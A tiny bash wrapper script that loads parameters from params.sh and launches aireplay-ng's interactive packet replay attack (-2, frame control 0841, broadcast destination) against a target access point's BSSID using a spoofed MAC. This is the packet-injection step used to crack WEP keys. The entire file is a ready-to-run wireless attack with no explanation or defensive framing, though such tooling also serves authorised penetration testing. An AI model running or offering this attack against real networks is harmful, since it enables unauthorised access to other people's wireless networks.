#!/bin/bash

source ./params.sh

exec aireplay-ng -2 -p 0841 -c FF:FF:FF:FF:FF:FF -b "$STATION_BSSID" -h "$MY_MAC" "$MY_DEVICE"

